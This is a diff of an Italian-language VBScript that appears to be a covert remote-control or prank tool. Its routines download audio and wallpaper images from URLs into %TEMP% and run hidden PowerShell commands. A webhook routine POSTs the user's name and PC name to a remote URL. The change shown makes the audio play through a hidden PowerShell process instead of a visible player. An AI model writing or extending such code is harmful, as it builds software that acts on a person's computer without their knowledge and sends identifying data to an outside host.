@@ -85,8 +85,16 @@ InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, messaggioDalWeb, scel
 Sub RiproduciAudio(urlAudio) 
     Dim p: p = shell.ExpandEnvironmentStrings("%TEMP%") & "\a.mp3" 
     shell.Run "powershell -Command ""(New-Object Net.WebClient).DownloadFile('" & urlAudio & "', '" & p & "')""", 0, True 
-    If fso.FileExists(p) Then shell.Run "wmplayer.exe """ & p & """ /Play", 7, False 
-End Sub 
+
+    If fso.FileExists(p) Then 
+        ' Avvia un processo PowerShell separato e nascosto che gestisce l'audio
+        Dim psCmd
+        psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -AssemblyName PresentationCore; " & _
+                "$m = New-Object System.Windows.Media.MediaPlayer; " & _
+                "$m.Open('" & p & "'); $m.Play(); Start-Sleep -Seconds 300""" ' 300 è la durata massima stimata
+        shell.Run psCmd, 0, False 
+    End If 
+End Sub
 
 Sub CambiaFondoDesktop(urlImmagine) 
     Dim imgPath: imgPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\bg_current.jpg" 
@@ -108,5 +116,4 @@ Sub InviaNotificaRemoteWebhook(url, utente, pc, messaggio, scelta)
                    "Invoke-RestMethod -Uri '" & url & "' -Method Post -Body (" & body & ") -ContentType 'application/json'"""
     shell.Run cmd, 0, True 
 End Sub
-
 
